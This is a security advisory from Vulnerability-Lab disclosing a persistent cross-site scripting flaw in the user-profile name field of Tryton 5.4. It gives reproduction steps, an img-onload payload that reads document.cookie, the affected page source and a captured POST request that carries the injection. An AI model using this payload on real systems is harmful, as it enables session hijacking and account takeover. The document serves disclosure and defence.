@@ -1,0 +1,171 @@
+# Exploit Title: Tryton 5.4 - Persistent Cross-Site Scripting
+# Exploit Author: Vulnerability-Lab
+# Date: 2020-05-13
+# Vendor Homepage: https://www.tryton.org/
+# Version: 5.4
+# Software Link: https://www.tryton.org/download
+
+
+Document Title:
+===============
+Tryton v5.4 - (Name) Persistent Cross Site Vulnerability
+
+
+References (Source):
+====================
+https://www.vulnerability-lab.com/get_content.php?id=2233
+
+
+Common Vulnerability Scoring System:
+====================================
+4.4
+
+
+Product & Service Introduction:
+===============================
+https://www.tryton.org/  &  https://www.tryton.org/download
+
+
+Affected Product(s):
+====================
+Tryton Foundation
+Product: Tryton v5.4 - CMS (Web-Application)
+
+
+Vulnerability Disclosure Timeline:
+==================================
+2020-05-12: Public Disclosure (Vulnerability Laboratory)
+
+
+Technical Details & Description:
+================================
+A persistent input validation web vulnerability has been discovered in
+the official Tryton v5.4 web-application series.
+The vulnerability allows remote attackers to inject own malicious script
+codes with persistent attack vector to compromise
+browser to web-application requests from the application-side.
+
+The persistent vulnerability is located in the `name` parameter of the
+`User Profile` module. Remote attackers with low
+privileges are able to inject own malicious persistent script code as
+name for user accounts. The injected code can be
+used to attack the frontend or backend of the web-application. The
+request method to inject is POST and the attack vector
+is located on the application-side. Injection point is the profile input
+field with the name value and the execute occurs
+in the front ui on top right were the avatar is listed or in the admin
+backend on the res.user;name="Users"&views.
+
+Successful exploitation of the vulnerabilities results in session
+hijacking, persistent phishing attacks, persistent
+external redirects to malicious source and persistent manipulation of
+affected application modules.
+
+Request Method(s):
+[+] POST
+
+Vulnerable Module(s):
+[+] User Profile
+
+Vulnerable Input(s):
+[+] Name
+
+Vulnerable Parameter(s):
+[+] name
+
+Affected Module(s):
+[+] /index
+[+] /model/res.user;name="Users"&views (backend)
+
+
+Proof of Concept (PoC):
+=======================
+The persistent web vulnerability can be exploited by low privileged web
+application user account with low user interaction.
+For security demonstration or to reproduce the vulnerability follow the
+provided information and steps below to continue.
+
+
+Manual steps to reproduce the vulnerability ...
+1. Open the application and login to your low privileged user account
+2. Move to the profile on top right side (click)
+3. Inject test payload to the "Name" input field and save the entry
+4. Execution occurs after save on top right and
+/model/res.user;name="Users"&views of the admin backend
+5. Successful reproduce of the persistent cross site vulnerability!
+
+
+PoC: Payload
+%20>"><img%20src="evil.source%20onload=alert(document.cookie)>
+
+
+PoC: Vulnerable Source (Execution Point)
+<div class="input-group input-group-sm"><span
+class="input-group-btn"><button type="button" class="btn
+btn-default">Filters</button></span>
+<input class="form-control mousetrap" placeholder="Search"
+autocomplete="off" list="ui-id-3"><datalist id="ui-id-3"></datalist>
+<span class="input-group-btn"><button type="button" class="btn
+btn-default hidden-md hidden-lg" aria-label="Clear Search"
+title="Clear Search" style="display: none;"><img class="icon"
+src="blob:https://tryton.localhost:8080/4672612e-3ec6-4bd1-aa4d-bd379bd89c04"></button>
+<button type="submit" class="btn btn-default" aria-label="Search"
+title="Search"><img class="icon"
+src="blob:https://demo5.4.tryton.org/ab0d098c-1302-4ffa-8f27-3204fb244082"></button><button
+class="btn btn-default hidden-xs"
+type="button" title="Bookmark this filter" aria-label="Bookmark this
+filter"><img class="icon" aria-hidden="true"
+src="blob:https://demo5.4.tryton.org/d97b8af2-ca4b-48e2-a40e-a772955d7ea8"></button><button
+type="button" class="btn btn-default
+dropdown-toggle" data-toggle="dropdown" aria-expanded="false"
+aria-label="Bookmarks" title="Bookmarks" id="bookmarks" disabled="">
+<img aria-hidden="true" class="icon"
+src="blob:https://demo5.4.tryton.org/c9b2efdd-1ec8-4785-b7a0-d3b8dcb6d7e9"></button>
+<ul class="dropdown-menu dropdown-menu-right" role="menu"
+aria-labelledby="bookmarks"></ul><button type="button"
+class="btn btn-default hidden-xs" aria-expanded="false" aria-label="Show
+inactive records" title="Show inactive records">
+<img aria-hidden="true" class="icon"
+src="blob:https://demo5.4.tryton.org/6ad6ad9c-4d17-4592-9e3c-6f698b6f9a27"></button></span></div>
+
+
+--- PoC Session Logs [POST] ---
+https://tryton.localhost:8080/tryton/
+Host: tryton.localhost:8080
+Accept: application/json, text/javascript, */*; q=0.01
+Content-Type: application/json
+Authorization: Session
+ZGVtbzoyOjMyYmIyOWE3ODYxMzA3NGVkZThlMDBhNmEyMWVkNzFhZTAxOGQwMzA1YTJhMGU1NTNjOWU2YTNhZWM5MzA1MzM=
+X-Requested-With: XMLHttpRequest
+Content-Length: 527
+Origin: https://tryton.localhost:8080
+Connection: keep-alive
+Referer: https://tryton.localhost:8080/
+{"id":195,"method":"model.res.user.set_preferences","params":[{"name":"%20>"><img%20src="evil.source%20onload=alert(document.cookie)>">",
+"signature":"test
+signature"},{"client":"1aab6de2-1f59-43de-b0d0-a8319558e4e8","warehouse":null,"employee":null,"company":1,
+"company.rec_name":"Michael Scott Paper
+Company","language":"en","language_direction":"ltr","groups":[5,15,16,13,19,20,17,9,10],
+"locale":{"date":"%m/%d/%Y","grouping":[3,3,0],"decimal_point":".","thousands_sep":","},"company_work_time":
+{"h":3600,"m":60,"s":1,"Y":6912000,"M":576000,"w":144000,"d":28800}}]}
+-
+POST: HTTP/2.0 200 OK
+server: nginx/1.16.1
+content-type: application/json
+access-control-allow-origin: https://tryton.localhost:8080
+vary: Origin
+content-encoding: gzip
+
+
+Credits & Authors:
+==================
+Vulnerability-Lab -
+https://www.vulnerability-lab.com/show.php?user=Vulnerability-Lab
+Benjamin Kunz Mejri -
+https://www.vulnerability-lab.com/show.php?user=Benjamin%20K.M.
+
+
+
+
+-- 
+VULNERABILITY LABORATORY - RESEARCH TEAM
